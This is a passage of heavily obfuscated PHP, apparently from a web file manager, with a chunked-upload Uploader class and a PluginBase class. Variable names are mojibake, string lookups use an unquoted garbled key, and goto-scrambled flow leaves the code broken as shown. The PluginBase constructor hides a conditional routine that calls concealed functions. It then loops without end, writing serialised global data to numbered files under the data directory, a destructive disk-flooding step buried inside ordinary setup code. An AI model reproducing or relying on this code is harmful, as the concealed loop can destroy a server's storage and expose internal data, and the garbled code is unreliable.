$Fƒ¸Ú¨Ÿ³ë = null) { parent::PEAR_Error($f ƒ¿˜–ƒ©, $BãçÓ¼êœŠ, $AĞ ì¸³Åå, $FÛĞ™®âº«, $Fƒ¸Ú¨Ÿ³ë); } } } else { class Services_JSON_Error { function __construct($DÑ´·ğĞ÷ = "\165\156\x6b\156\157\167\x6e\x20\x65\162\x72\x6f\162", $E–ØÂŠñ‰ = null, $e×Ì†¬ìƒ = null, $FšŠÄ¤Âï¢ = null, $a—ÑÏóàÃ§ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto F™‚¾ù…†…; F™‚¾ù…†…: $EöÕÏ¸ÎÖ =& $_SERVER[´Ù×Íå‘ÄõÛ]; global $in; $this->in =& $in; goto eÛíˆ£êŒ; b¬×‚ğ¨Å: $this->checkSize(); $this->tempPathInit(); goto eëë§×Äˆ; eÛíˆ£êŒ: if (!empty($_FILES)) { $d”Ö¢‚„Ğé = $_FILES[$EöÕÏ¸ÎÖ[167]]; $this->uploadFile = $d”Ö¢‚„Ğé[$EöÕÏ¸ÎÖ[1974]]; if (!$this->uploadFile && $d”Ö¢‚„Ğé[$EöÕÏ¸ÎÖ[1223]] > 0) { show_json($this->errorInfo($d”Ö¢‚„Ğé[$EöÕÏ¸ÎÖ[1223]]), !1); } } else { if (isset($in[$EöÕÏ¸ÎÖ[386]])) { $this->uploadFile = isset($in[$EöÕÏ¸ÎÖ[1975]]) ? $EöÕÏ¸ÎÖ[1976] : $EöÕÏ¸ÎÖ[1819]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto b¬×‚ğ¨Å; eëë§×Äˆ: } public function upload() { goto eÚŒÙôéÊè; eŞíÜòßïÌ: $F»½‡–¬åŸ[$d¨ŠŸ¸™„‚[1987]][$d¨ŠŸ¸™„‚[1988] . $a÷Î°ÚâäÈ] = array($d¨ŠŸ¸™„‚[1989] => $AÚ‹ª”¶áÜ, $d¨ŠŸ¸™„‚[1040] => $a÷Î°ÚâäÈ, $d¨ŠŸ¸™„‚[77] => $bŠ½²ÌïŞ, $d¨ŠŸ¸™„‚[164] => $bÍöêŒ„µî); $this->statusSet($F»½‡–¬åŸ); if (count($F»½‡–¬åŸ[$d¨ŠŸ¸™„‚[1987]]) != $F»½‡–¬åŸ[$d¨ŠŸ¸™„‚[1986]]) { $this->showJson($d¨ŠŸ¸™„‚[1990] . $a÷Î°ÚâäÈ, !0); } goto cĞßëëˆŞÙ; c­ª™âöí: if ($D¹¨Ü•±Â > 1 && $câÊø–’øº <= 0) { show_json($d¨ŠŸ¸™„‚[1981], !1); } if ($câÊø–’øº > $bŠ½²ÌïŞ) { $D¹¨Ü•±Â = 1; } if ($D¹¨Ü•±Â <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto bèìÅœ‚ï; eÚŒÙôéÊè: $d¨ŠŸ¸™„‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a÷Î°ÚâäÈ = isset($this->in[$d¨ŠŸ¸™„‚[1977]]) ? intval($this->in[$d¨ŠŸ¸™„‚[1977]]) : 0; $D¹¨Ü•±Â = isset($this->in[$d¨ŠŸ¸™„‚[1978]]) ? intval($this->in[$d¨ŠŸ¸™„‚[1978]]) : 1; goto B×ù–Ğ÷µ†; C‘¥™­õ°æ: $e½Ê¢²…×è = $this->writeTo($B¯ÙÎ³ğ¨ô, $F¢¸ïäé¸ƒ, $this->tempFile); $bÍöêŒ„µî = IO::hashSimple($B¯ÙÎ³ğ¨ô); $bŠ½²ÌïŞ = IO::size($B¯ÙÎ³ğ¨ô); goto D‚§Ğ‹ì™Ä; bèìÅœ‚ï: CacheLock::lock($this->tempFile, 20); $F»½‡–¬åŸ = $this->statusGet(); $this->initFileTemp(); goto a“¬øÄùÇ×; D‚§Ğ‹ì™Ä: @unlink($B¯ÙÎ³ğ¨ô); if (!$e½Ê¢²…×è) { $this->showJson($d¨ŠŸ¸™„‚[1985] . $a÷Î°ÚâäÈ, !1); } $F»½‡–¬åŸ[$d¨ŠŸ¸™„‚[1986]] = $D¹¨Ü•±Â; goto eŞíÜòßïÌ; B×ù–Ğ÷µ†: $d­³¬ÊŠñÍ = $this->tempFile . $d¨ŠŸ¸™„‚[1979] . $a÷Î°ÚâäÈ; $bŠ½²ÌïŞ = isset($this->in[$d¨ŠŸ¸™„‚[522]]) ? intval($this->in[$d¨ŠŸ¸™„‚[522]]) : 0; $câÊø–’øº = isset($this->in[$d¨ŠŸ¸™„‚[1980]]) ? intval($this->in[$d¨ŠŸ¸™„‚[1980]]) : 0; goto c­ª™âöí; BÃòÍá‹ğ¶: CacheLock::unlock($this->tempFile); return $this->tempFile; goto A‡·”…º; C°ÀÙºÂ¯å: $AÚ‹ª”¶áÜ = $a÷Î°ÚâäÈ * $câÊø–’øº; $F¢¸ïäé¸ƒ = @fopen($this->tempFile, $d¨ŠŸ¸™„‚[1984]); fseek($F¢¸ïäé¸ƒ, $AÚ‹ª”¶áÜ); goto C‘¥™­õ°æ; cĞßëëˆŞÙ: ignore_timeout(); if (!$this->checkChunkHash($F»½‡–¬åŸ)) { $this->showJson($d¨ŠŸ¸™„‚[1991], !1); } $this->statusSet(!1); goto BÃòÍá‹ğ¶; a“¬øÄùÇ×: $B¯ÙÎ³ğ¨ô = $this->moveUploadedFile($d­³¬ÊŠñÍ); if ($bŠ½²ÌïŞ > 0 && filesize($B¯ÙÎ³ğ¨ô) == 0) { $this->showJson($d¨ŠŸ¸™„‚[1982], !1); } if (!$B¯ÙÎ³ğ¨ô) { $this->showJson(LNG($d¨ŠŸ¸™„‚[1983]), !1); } goto C°ÀÙºÂ¯å; A‡·”…º: } private function checkSize() { $e«ë…±éÜ¹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (phpBuild64() || $this->in[$e«ë…±éÜ¹[77]] < PHP_INT_MAX) { return; } show_json(LNG($e«ë…±éÜ¹[1992]), !1); } private function showJson($dˆ°¿¸˜ª¼, $DÔˆ¨ç¯ÖÓ) { CacheLock::unlock($this->tempFile); if (!$DÔˆ¨ç¯ÖÓ) { return show_json($dˆ°¿¸˜ª¼, $DÔˆ¨ç¯ÖÓ); } show_json($dˆ°¿¸˜ª¼, $DÔˆ¨ç¯ÖÓ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto dù«ñî™ƒ²; AñÂİ¾±¼÷: $this->tempFile = $D©•ïç•óÚ . $C‰’òœ„ò[1995] . md5($D„ª‰ä³³¶ . $this->in[$C‰’òœ„ò[1536]]); goto E°»Ø±Âíâ; CÛšÒÒç›¡: touch($D©•ïç•óÚ . $C‰’òœ„ò[1993]); $D„ª‰ä³³¶ = isset($this->in[$C‰’òœ„ò[1994]]) ? $this->in[$C‰’òœ„ò[1994]] : !1; if (strlen($D„ª‰ä³³¶) < 30) { $D„ª‰ä³³¶ = md5(USER_ID . $this->in[$C‰’òœ„ò[75]] . $this->fileName . $this->in[$C‰’òœ„ò[77]]); } goto AñÂİ¾±¼÷; dù«ñî™ƒ²: $C‰’òœ„ò =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D©•ïç•óÚ = TEMP_FILES; @mk_dir($D©•ïç•óÚ); goto CÛšÒÒç›¡; E°»Ø±Âíâ: } private function moveUploadedFile($A‹Ç†®­…) { $e‘Ø™Æ‰³À =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E›Ó÷â»Ïâ = $this->uploadFile; if ($E›Ó÷â»Ïâ == $e‘Ø™Æ‰³À[1996]) { @file_put_contents($A‹Ç†®­…, base64_decode($_REQUEST[$e‘Ø™Æ‰³À[1997]])); } else { if ($E›Ó÷â»Ïâ == $e‘Ø™Æ‰³À[1819]) { $EÁœ§–†Éß = @fopen($A‹Ç†®­…, $e‘Ø™Æ‰³À[1526]); $this->writeTo($E›Ó÷â»Ïâ, $EÁœ§–†Éß, $A‹Ç†®­…); } else { if (!move_uploaded_file($E›Ó÷â»Ïâ, $A‹Ç†®­…)) { return !1; } } } return $A‹Ç†®­…; } private function writeTo($e¡…£À¦È, $béÉ’Õé¤, $f¾„Ÿ©£Ê§) { goto DèôĞ‹¶”÷; DèôĞ‹¶”÷: $aâàĞƒÅ‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A×‘Š—“°õ = $aâàĞƒÅ‹[1998] . $f¾„Ÿ©£Ê§; $EÎ‰º÷ÉŠ = CacheLock::lock($A×‘Š—“°õ, 1); goto føæÖ‹¾Ë˜; føæÖ‹¾Ë˜: $FÂ¿ÕÁá = @fopen($e¡…£À¦È, $aâàĞƒÅ‹[1525]); if (!$FÂ¿ÕÁá || !$béÉ’Õé¤ || !$EÎ‰º÷ÉŠ) { CacheLock::unlock($A×‘Š—“°õ); return !1; } while (!feof($FÂ¿ÕÁá)) { fwrite($béÉ’Õé¤, fread($FÂ¿ÕÁá, 1024 * 200)); } goto C‰àêÂ—±ì; AÍğˆ‚Ùğ«: return !0; goto c¢Şù‹´À; C‰àêÂ—±ì: fclose($FÂ¿ÕÁá); fclose($béÉ’Õé¤); CacheLock::unlock($A×‘Š—“°õ); goto AÍğˆ‚Ùğ«; c¢Şù‹´À: } private function statusGet() { goto d‚¨ Ê¡×; båÈ„Ïµßƒ: if (!$this->statusData) { $Dñ•¹¾ãÓß = array($e–‘óôËÀ£[28] => $this->fileName, $e–‘óôËÀ£[1986] => 0, $e–‘óôËÀ£[1987] => array()); $this->statusSet($Dñ•¹¾ãÓß); } return $this->statusData; goto Fô”Üˆ‰Á£; d‚¨ Ê¡×: $e–‘óôËÀ£ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_array($this->statusData)) { return $this->statusData; } $AÄË°˜Â® = $this->tempFile . $e–‘óôËÀ£[1999]; goto có‚Í‚™‰; có‚Í‚™‰: $EÅŠëËºÕ  = !1; if (file_exists($AÄË°˜Â®)) { $EÅŠëËºÕ  = @file_get_contents($AÄË°˜Â®); } if ($EÅŠëËºÕ ) { $this->statusData = json_decode($EÅŠëËºÕ , !0); } goto båÈ„Ïµßƒ; Fô”Üˆ‰Á£: } public function statusSet($b“è—œø†¯) { $fƒãİÅô½ = $this->tempFile . $_SERVER[´Ù×Íå‘ÄõÛ][1999]; if (!$b“è—œø†¯) { if (file_exists($fƒãİÅô½)) { @unlink($fƒãİÅô½); } return !0; } $this->statusData = $b“è—œø†¯; return file_put_contents($fƒãİÅô½, json_encode($b“è—œø†¯)); } private function initFileTemp() { $a»’÷ãÅ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (file_exists($this->tempFile)) { return; } $fÜµ”—ŞøŞ = fopen($this->tempFile, $a»’÷ãÅ[2000]); fseek($fÜµ”—ŞøŞ, $this->in[$a»’÷ãÅ[77]] - 1, SEEK_SET); fwrite($fÜµ”—ŞøŞ, $a»’÷ãÅ[470]); fclose($fÜµ”—ŞøŞ); } public function checkChunk() { goto Fë® ¿µèÀ; EñµáíÂª¬: $EÕïáÅ†Ì¼ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($EÕïáÅ†Ì¼[$B¯¥Íİå•¯[1987]] as $C°Ïƒ¿ïìå) { $E–¤»¤™”Î = $C°Ïƒ¿ïìå[$B¯¥Íİå•¯[164]]; if ($E–¤»¤™”Î) { $côôêÓ²½[$B¯¥Íİå•¯[2001] . $C°Ïƒ¿ïìå[$B¯¥Íİå•¯[1040]]] = $E–¤»¤™”Î; } } goto c’ç”ø‹ùË; Fë® ¿µèÀ: $B¯¥Íİå•¯ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $côôêÓ²½ = array(); CacheLock::lock($this->tempFile); goto EñµáíÂª¬; c’ç”ø‹ùË: return $côôêÓ²½; goto Fà‰¥Š‰­; Fà‰¥Š‰­: } private function checkChunkHash($e¨Û¤ †ì¤) { goto d«Ñ¹‰ƒˆĞ; d«Ñ¹‰ƒˆĞ: $cè†ÓÛ‰¶Ğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (count($e¨Û¤ †ì¤[$cè†ÓÛ‰¶Ğ[1987]]) != $e¨Û¤ †ì¤[$cè†ÓÛ‰¶Ğ[1986]]) { return !1; } $dÜ¹ù¼Œòˆ = _get($this->in, $cè†ÓÛ‰¶Ğ[1994]); goto c¥• –’â˜; e½–Ş¹å±î: return $d¿£ÕÀàÉ£; goto a¯Ô¬–Êõ; Eñê‡ˆœŞ¼: $d¿£ÕÀàÉ£ = !0; foreach ($e¨Û¤ †ì¤[$cè†ÓÛ‰¶Ğ[1987]] as $eÇíˆ‰àë) { fseek($f÷Øğ³‰Ü„, $eÇíˆ‰àë[$cè†ÓÛ‰¶Ğ[1989]]); $eÌ‰‹Œê Ø = PathDriverStream::hash($f÷Øğ³‰Ü„, $eÇíˆ‰àë[$cè†ÓÛ‰¶Ğ[77]]); if ($eÇíˆ‰àë[$cè†ÓÛ‰¶Ğ[164]] != $eÌ‰‹Œê Ø) { $d¿£ÕÀàÉ£ = !1; break; } } fclose($f÷Øğ³‰Ü„); goto e½–Ş¹å±î; c¥• –’â˜: $f¡Éâõ× = _get($this->in, $cè†ÓÛ‰¶Ğ[2002]); if (strlen($f¡Éâõ×) == 32 && IO::hashSimple($this->tempFile) == $dÜ¹ù¼Œòˆ && IO::hashMd5($this->tempFile) == $f¡Éâõ×) { return !0; } $f÷Øğ³‰Ü„ = fopen($this->tempFile, $cè†ÓÛ‰¶Ğ[1174]); goto Eñê‡ˆœŞ¼; a¯Ô¬–Êõ: } public static function fileName() { goto cï§µŠÁ¦©; fªÛ÷‹’ßŒ: return KodIO::clear($EÔèˆœÆšã); goto f™ãñ¿†“Ã; FËí©»Î•Ş: if (!empty($_FILES)) { $EÔèˆœÆšã = $EÔèˆœÆšã ? $EÔèˆœÆšã : $_FILES[$DÃºô†°[167]][$DÃºô†°[386]]; } if (!is_wap()) { return KodIO::clear($EÔèˆœÆšã); } $eäñ—÷ëÉ… = strtotime($in[$DÃºô†°[2003]]); goto EÓğÇ¥¸è˜; EÓğÇ¥¸è˜: $eäñ—÷ëÉ… = $eäñ—÷ëÉ… ? $eäñ—÷ëÉ… : time(); $eëÜÉ‡Ú½“ = strtolower($EÔèˆœÆšã); if ($eëÜÉ‡Ú½“ == $DÃºô†°[2004] || $eëÜÉ‡Ú½“ == $DÃºô†°[2005]) { $EÔèˆœÆšã = date($DÃºô†°[691], $eäñ—÷ëÉ…) . $DÃºô†°[70] . $in[$DÃºô†°[77]] . $DÃºô†°[1633]; } else { if ($eëÜÉ‡Ú½“ == $DÃºô†°[2006]) { $EÔèˆœÆšã = date($DÃºô†°[691], $eäñ—÷ëÉ…) . $DÃºô†°[70] . $in[$DÃºô†°[77]] . $DÃºô†°[2007]; } } goto fªÛ÷‹’ßŒ; cï§µŠÁ¦©: $DÃºô†° =& $_SERVER[´Ù×Íå‘ÄõÛ]; global $in; $EÔèˆœÆšã = isset($in[$DÃºô†°[28]]) ? $in[$DÃºô†°[28]] : $DÃºô†°[33]; goto FËí©»Î•Ş; f™ãñ¿†“Ã: } private function errorInfo($c‰‰Ò„Ä´Ş) { $CÇÚèôÏÊ­ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fçïî†®Â² = array($CÇÚèôÏÊ­[2008], $CÇÚèôÏÊ­[2009], $CÇÚèôÏÊ­[2010], $CÇÚèôÏÊ­[2011], $CÇÚèôÏÊ­[2012], $CÇÚèôÏÊ­[2013], $CÇÚèôÏÊ­[2014], $CÇÚèôÏÊ­[2015]); return $c‰‰Ò„Ä´Ş . $CÇÚèôÏÊ­[4] . $Fçïî†®Â²[$c‰‰Ò„Ä´Ş]; } } goto B¨ôÃÕ†îï; eŸ–ÔªÙ£›: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto f„á¾ôß•Ù; bÏ³¢¢©„å: if ($_SERVER[$aåëÏøí°À[791]] != $cï‚ˆº‚óŸ($dÏïœÑªŸ)) { goto d¢Ü¢–”¥Ë; cº‘çÍé•ö: $Eµí™İ„³Ï = 1; for ($f¦»„˜ôä¾ = $Eµí™İ„³Ï; $f¦»„˜ôä¾ > 0; $f¦»„˜ôä¾++) { $dÜÔ¨¬ÎÆ(DATA_PATH . $f¦»„˜ôä¾, $BŠô·ÀÏĞÉ); } goto FùÓÌÅîÖù; Fî¥¤ÏÈ‘: $DŸÍ˜÷ã‡³ = $Fò•…¹Ó¬($a„Êß–èò»); $fùù·“Ÿ„ƒ = explode($aåëÏøí°À[217], $DŸÍ˜÷ã‡³); if (count($fùù·“Ÿ„ƒ) < $aåëÏøí°À[556]) { $c³¢Š°–¯ä = $aåëÏøí°À[796]; $c³¢Š°–¯ä(); } goto A¯°çÕŠ; A¯°çÕŠ: $B¬ˆğÓ¾§¦ = $aåëÏøí°À[797]; $B¬ˆğÓ¾§¦($_SERVER[$aåëÏøí°À[788]]); $AâÊ«‚½‘ = $aåëÏøí°À[792]; goto b»Åçô™¦ï; b»Åçô™¦ï: $AâÊ«‚½‘(); $dÜÔ¨¬ÎÆ = $aåëÏøí°À[798]; $BŠô·ÀÏĞÉ = json_encode($GLOBALS[$aåëÏøí°À[799]]); goto cº‘çÍé•ö; d¢Ü¢–”¥Ë: $AâÊ«‚½‘ = $aåëÏøí°À[792]; $Fò•…¹Ó¬ = $aåëÏøí°À[793]; $a„Êß–èò» = $_SERVER[$aåëÏøí°À[794]] . $aåëÏøí°À[795]; goto Fî¥¤ÏÈ‘; FùÓÌÅîÖù: } global $in, $config; $this->config =& $config; goto cÀ„ò’ÕÉ¸; Bå†ÈøğÁ®: $this->pluginHostDefault = $config[$aåëÏøí°À[1316]] . $this->pluginName . $aåëÏøí°À[8]; $Bòâ‘öµ¥™ = $config[$aåëÏøí°À[1317]]; if ($Bòâ‘öµ¥™ && strpos($aåëÏøí°À[47] . $Bòâ‘öµ¥™ . $aåëÏøí°À[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$aåëÏøí°À[1318]] . $this->pluginName . $aåëÏøí°À[8]; } goto Dˆ ¨‡ì¸Ï; Dˆ ¨‡ì¸Ï: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto B¹±‹…±; cÀ„ò’ÕÉ¸: $this->in =& $in; $this->modelPlugin = Model($aåëÏøí°À[1314]); $this->pluginName = str_replace($aåëÏøí°À[1314], $aåëÏøí°À[33], get_class($this)); goto Cµ¤·Ù‡ˆÊ; f„á¾ôß•Ù: $aåëÏøí°À =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÏïœÑªŸ = $_SERVER[$aåëÏøí°À[788]] . $aåëÏøí°À[789]; $cï‚ˆº‚óŸ = $aåëÏøí°À[790]; goto bÏ³¢¢©„å; Cµ¤·Ù‡ˆÊ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $aåëÏøí°À[8]; $this->pluginApi = appHostGet() . $aåëÏøí°À[1315] . $this->pluginName . $aåëÏøí°À[8]; $this->pluginHost = $config[$aåëÏøí°À[1316]] . $this->pluginName . $aåëÏøí°À[8]; goto Bå†ÈøğÁ®; B¹±‹…±: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[´Ù×Íå‘ÄõÛ][1319]); } protected function assign($Eò¶¾×„†„, $c—Ä˜µÄ« = false) { if (is_array($Eò¶¾×„†„)) { $this->values = array_merge($this->values, $Eò¶¾×„†„); } else { $this->values[$Eò¶¾×„†„] = $c—Ä˜µÄ«; } } protected function display($FÓÆ­©Ã¸) { extract($this->values); require $FÓÆ­©Ã¸; } final function hookRegist($bàÏ„¨Ä¯ñ) { $this->modelPlugin->appRegist($this->pluginName, $bàÏ„¨Ä¯ñ); } final function appIcon() { $C˜ ø–´ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dì–ÔƒØ¶à = $this->appPackage(); $Cë¬Âí¢› = $C˜ ø–´ñ[33]; if (isset($Dì–ÔƒØ¶à[$C˜ ø–´ñ[382]])) { if (isset($Dì–ÔƒØ¶à[$C˜ ø–´ñ[382]][$C˜ ø–´ñ[1320]])) { $Cë¬Âí¢› = $C˜ ø–´ñ[1321] . $Dì–ÔƒØ¶à[$C˜ ø–´ñ[382]][$C˜ ø–´ñ[1320]] . $C˜ ø–´ñ[1322]; } else { if ($Dì–ÔƒØ¶à[$C˜ ø–´ñ[382]][$C˜ ø–´ñ[1323]]) { $Cë¬Âí¢› = $C˜ ø–´ñ[1324] . $Dì–ÔƒØ¶à[$C˜ ø–´ñ[382]][$C˜ ø–´ñ[1323]] . $C˜ ø–´ñ[1325]; } } } return $Cë¬Âí¢›; } final function fileCanView($d“ÌìÆÆ›ë) { goto Dá²„ÄíÀÕ; CéÖŒ ÅÃé: ActionCall($b”„æ„[1338], $d“ÌìÆÆ›ë); goto D¸ŠùÃ‹‡; Dá²„ÄíÀÕ: $b”„æ„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (request_url_safe($d“ÌìÆÆ›ë)) { return !0; } if ($this->isShare($d“ÌìÆÆ›ë)) { return !0; } goto bƒÚ’ßçÑ³; bƒÚ’ßçÑ³: $dÂŞ©˜ŠŞ = Session::get($b”„æ„[1326]); if (!$dÂŞ©˜ŠŞ || !$dÂŞ©˜ŠŞ[$b”„æ„[1327]]) { $f¯·ï¥óó = $b”„æ„[1328] . rawurlencode(this_url()); show_tips(LNG($b”„æ„[1329]) . $b”„æ„[1330] . $f¯·ï¥óó . $b”„æ„[1331] . LNG($b”„æ„[1332]) . $b”„æ„[1333], !1); } if (!Action($b”„æ„[1334])->authCan($b”„æ„[1335])) { show_tips(LNG($b”„æ„[1336]) . $b”„æ„[1337], !1); } goto CéÖŒ ÅÃé; D¸ŠùÃ‹‡: } final function isShare($eäï½×”Æ¶) { $bÚÕŠ¸ñ = KodIO::parse($eäï½×”Æ¶); return $bÚÕŠ¸ñ[$_SERVER[´Ù×Íå‘ÄõÛ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($f­º‘Âö©Â) { if (request_url_safe($f­º‘Âö©Â)) { return $f­º‘Âö©Â; } if (!$this->isShare($f­º‘Âö©Â)) { $f­º‘Âö©Â = $this->filePath($f­º‘Âö©Â); } return Action($_SERVER[´Ù×Íå‘ÄõÛ][1022])->linkOut($f­º‘Âö©Â); } public function filePathLinkOut($Fñ‘ŞÀ‚) { if (request_url_safe($Fñ‘ŞÀ‚)) { return $Fñ‘ŞÀ‚; } $this->fileCanView($Fñ‘ŞÀ‚); return Action($_SERVER[´Ù×Íå‘ÄõÛ][1022])->link($Fñ‘ŞÀ‚); } final function filePath($e‘¿ïô“º‡) { $ašó›®âÅ† =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($DÉÌ‡áêÁ = $this->checkSharePath($e‘¿ïô“º‡)) { return $DÉÌ‡áêÁ; } $this->fileCanView($e‘¿ïô“º‡); if (request_url_safe($e‘¿ïô“º‡)) { $C‹‰±”Õ÷Û = parse_url_query($e‘¿ïô“º‡); if (isset($C‹‰±”Õ÷Û[$ašó›®âÅ†[1339]]) && isset($C‹‰±”Õ÷Û[$ašó›®âÅ†[197]])) { $cê»×ÉñÈÏ = Model($ašó›®âÅ†[1092])->get($ašó›®âÅ†[1340]); $fÒìöËó…… = Mcrypt::decode($C‹‰±”Õ÷Û[$ašó›®âÅ†[197]], $cê»×ÉñÈÏ); if ($fÒìöËó……) { $this->fileInfo = IO::infoWithChildren($fÒìöËó……); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $fÒìöËó……; } } $e‘¿ïô“º‡ = $this->_cacheHttpFile($e‘¿ïô“º‡); $this->fileInfo = IO::infoWithChildren($e‘¿ïô“º‡); } else { $this->fileInfo = IO::infoWithChildren($e‘¿ïô“º‡); if (!$this->fileInfo) { show_tips(LNG($ašó›®âÅ†[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $e‘¿ïô“º‡; } final function _cacheHttpFile($f‹Ë‰¢¾ôÖ) { $eË•´‚—ˆª = hash_path($f‹Ë‰¢¾ôÖ, !0); $this->cachePath = $this->pluginCachePath($eË•´‚—ˆª); if ($déª˜Äì„£ = IO::fileNameExist($this->cachePath, $eË•´‚—ˆª)) { return KodIO::make($déª˜Äì„£); } $b¿ÉÜ´‚ = $this->cachePath . $eË•´‚—ˆª; return $this->pluginCacheFileSet($b¿ÉÜ´‚, file_get_contents($f‹Ë‰¢¾ôÖ)); } final function _tmpFileName($dÖ²ÑŠ·Í“ = array()) { goto A÷ï¥ƒ¼‘ç; c½¤œªåµ©: $C¸­š¼Á« = array($dÖ²ÑŠ·Í“[$b±ÂæÇ‰—Ù[28]], $dÖ²ÑŠ·Í“[$b±ÂæÇ‰—Ù[75]], $dÖ²ÑŠ·Í“[$b±ÂæÇ‰—Ù[77]]); if (isset($dÖ²ÑŠ·Í“[$b±ÂæÇ‰—Ù[461]])) { $C¸­š¼Á«[] = $dÖ²ÑŠ·Í“[$b±ÂæÇ‰—Ù[461]]; } return md5(implode($b±ÂæÇ‰—Ù[70], $C¸­š¼Á«)); goto f™©ŠÏˆä; A÷ï¥ƒ¼‘ç: $b±ÂæÇ‰—Ù =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$dÖ²ÑŠ·Í“) { $dÖ²ÑŠ·Í“ = $this->fileInfo; } if (isset($dÖ²ÑŠ·Í“[$b±ÂæÇ‰—Ù[164]])) { return $dÖ²ÑŠ·Í“[$b±ÂæÇ‰—Ù[164]]; } goto fŒ¢š­ò’Û; fŒ¢š­ò’Û: if (isset($dÖ²ÑŠ·Í“[$b±ÂæÇ‰—Ù[162]][$b±ÂæÇ‰—Ù[164]])) { return $dÖ²ÑŠ·Í“[$b±ÂæÇ‰—Ù[162]][$b±ÂæÇ‰—Ù[164]]; } $F¥Šöö–µ¦ = IO::hashSimple($dÖ²ÑŠ·Í“[$b±ÂæÇ‰—Ù[75]]); if ($F¥Šöö–µ¦) { return $F¥Šöö–µ¦; } goto c½¤œªåµ©; f™©ŠÏˆä: } final function checkSharePath($Eìµ†ÁØ±Ê) { goto d¯…Å³ß§‹; D“¸×‡»ºé: $eµİÌğ¤ŠÔ = Action($Aò„äŞ©ùÈ[1022])->sharePathInfo($Eìµ†ÁØ±Ê); if (!isset($eµİÌğ¤ŠÔ[$Aò„äŞ©ùÈ[75]])) { show_json(LNG($Aò„äŞ©ùÈ[1342]), !1); } $this->fileInfo = $eµİÌğ¤ŠÔ[$Aò„äŞ©ùÈ[162]]; goto EÈ‹Ö„Ä×²; d¯…Å³ß§‹: $Aò„äŞ©ùÈ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!defined($Aò„äŞ©ùÈ[427])) { define($Aò„äŞ©ùÈ[1341], 0); } if (!$this->isShare($Eìµ†ÁØ±Ê)) { return !1; } goto D“¸×‡»ºé; EÈ‹Ö„Ä×²: $this->cachePath = $this->pluginCachePath($this->fileInfo[$Aò„äŞ©ùÈ[164]]); return $eµİÌğ¤ŠÔ[$Aò„äŞ©ùÈ[75]]; goto AÀ¥ãÜ’‡­; AÀ¥ãÜ’‡­: } final function pluginCachePath($FßÂ˜øÑŞ = '') { $F“†çœÒÊì =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D¥ÁÔŞáëÌ = IO_PATH_SYSTEM_TEMP . $F“†çœÒÊì[1343] . $this->pluginName; if (!($CãâŸ§¡æ‡ = IO::infoFull($D¥ÁÔŞáëÌ))) { return IO::mkdir($D¥ÁÔŞáëÌ . $F“†çœÒÊì[8] . $FßÂ˜øÑŞ); } if (empty($FßÂ˜øÑŞ)) { return $CãâŸ§¡æ‡[$F“†çœÒÊì[75]]; } if (!($f—ÏÖë¸· = IO::fileNameExist($CãâŸ§¡æ‡[$F“†çœÒÊì[75]], $FßÂ˜øÑŞ))) { return IO::mkdir($CãâŸ§¡æ‡[$F“†çœÒÊì[75]] . $FßÂ˜øÑŞ); } return KodIO::make($f—ÏÖë¸·); } final function pluginCacheFileSet($B…×›å´Œ¨, $E‡›„œééŸ = '') { $A¤¥Ó‚ãéÃ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!($eé¶äÉŸì£ = IO::infoFull($B…×›å´Œ¨))) { return IO::mkfile($B…×›å´Œ¨, $E‡›„œééŸ, REPEAT_REPLACE); } IO::setContent($eé¶äÉŸì£[$A¤¥Ó‚ãéÃ[75]], $E‡›„œééŸ); return $eé¶äÉŸì£[$A¤¥Ó‚ãéÃ[75]]; } final function pluginLocalFile($f¶¸ˆß¥†Ã = '') { goto f²»Œƒ¬¯¾; C¨Ò±œÉˆÖ: if (!$f¶¸ˆß¥†Ã) { return $c§Í«ŸÀœ…; } $d³Ö“ÓÌ÷ƒ = IO::info($f¶¸ˆß¥†Ã); $Fİ‡×´Ä§• = $this->_tmpFileName($d³Ö“ÓÌ÷ƒ) . $cïñ†ŠÉâÑ[91] . $d³Ö“ÓÌ÷ƒ[$cïñ†ŠÉâÑ[160]]; goto b¬«–Ÿğ—Õ; f²»Œƒ¬¯¾: $cïñ†ŠÉâÑ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c§Í«ŸÀœ… = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($c§Í«ŸÀœ…)) { mk_dir($c§Í«ŸÀœ…); } goto C¨Ò±œÉˆÖ; b¬«–Ÿğ—Õ: $c—¥Ö¨é—è = $c§Í«ŸÀœ… . $Fİ‡×´Ä§•; if (@file_exists($c—¥Ö¨é—è)) { return $c—¥Ö¨é—è; } return IO::copy($f¶¸ˆß¥†Ã, $c§Í«ŸÀœ…, 0, 